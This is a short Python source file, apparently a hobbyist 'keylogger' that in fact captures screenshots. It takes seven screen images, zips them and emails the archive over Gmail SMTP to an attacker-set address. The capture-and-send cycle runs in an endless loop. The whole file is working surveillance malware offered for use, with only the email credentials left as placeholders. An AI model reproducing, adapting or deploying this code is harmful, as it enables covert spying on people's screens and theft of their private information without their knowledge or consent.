"""
Keylogger - PRINT IMG

By Carlos Henrique Barros Silva Campos
"""
import pyautogui as py
import time
import os
import smtplib

from zipfile import *
from pathlib import Path

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


fromaddr = "Seu Email"
toaddr = "Seu Email"
passwd = "Sua Senha do Email"

# Cria pasta com as IMG
try:
    desktop = Path.home() / "Desktop"
    os.mkdir(f'{desktop}\\LogImg')
except:
    pass


def Tprint():
    for img in range(1, 7 + 1):
        time.sleep(1)
        py.screenshot(f'{desktop}\\LogImg\\{img}.png')


def PZipFile():
    with ZipFile(f'{desktop}\\LogImg\\keylogger.zip', 'w') as file:
        file.write(f'{desktop}\\LogImg\\1.png')
        file.write(f'{desktop}\\LogImg\\2.png')
        file.write(f'{desktop}\\LogImg\\3.png')
        file.write(f'{desktop}\\LogImg\\4.png')
        file.write(f'{desktop}\\LogImg\\5.png')
        file.write(f'{desktop}\\LogImg\\6.png')
        file.write(f'{desktop}\\LogImg\\7.png')


def Email():
    try:

        msg = MIMEMultipart()

        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "Print Keylogger"

        body = "\nKeylogger"

        msg.attach(MIMEText(body, 'plain'))

        filename = f'{desktop}\\LogImg\\keylogger.zip'

        attachment = open(filename, 'rb')

        part = MIMEBase('application', 'octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        msg.attach(part)

        attachment.close()

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, passwd)
        text = msg.as_string()
        server.sendmail(fromaddr, toaddr, text)
        server.quit()
        print('\nEmail enviado com sucesso!')
    except:
        print("\nErro ao enviar email")
# os.chdir(desktop)


def Main():
    Tprint()
    time.sleep(2)
    PZipFile()
    print('Sucesso!!!')
    Email()


while True:
    if __name__ == '__main__':
      Main()
